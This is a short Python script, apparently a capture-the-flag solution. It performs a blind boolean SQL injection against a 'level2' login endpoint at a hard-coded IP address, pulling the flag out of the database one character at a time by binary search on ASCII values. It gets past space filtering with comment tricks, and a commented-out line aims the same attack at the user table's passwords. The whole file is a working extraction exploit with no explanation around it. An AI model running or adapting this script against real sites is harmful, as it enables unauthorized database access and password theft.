import requests
flag=0
pwd=''
cur_num=0
left_num=0
right_num=128

for i in range(1,50):
    while True:
        cur_num=(int)((left_num+right_num)/2)
        if left_num==cur_num:
            left_num=0
            right_num=128
            pwd=pwd+chr(cur_num)
            print(pwd)
            break;
        url='http://106.12.37.37:8080/level2/?userid=(ascii(substr((select/**/flag/**/from/**/flag),%d,1))<%d)&password=219d03ad2d752ad2806ea1de18613158&token=21232f297a57a5a743894a0e4a801fc3'%(i,cur_num)
        #url='http://106.12.37.37:8080/level2/?userid=(ascii(substr((select/**/password/**/from/**/user),%d,1))<%d)&password=1&token=21232f297a57a5a743894a0e4a801fc3'%(i,cur_num)
        print(url+str(left_num)+' '+str(right_num))
        respond=requests.get(url).text[0:15]
        if respond.find('error userid')==-1:
            right_num=cur_num;
        else:
            left_num=cur_num;
    
print(pwd)

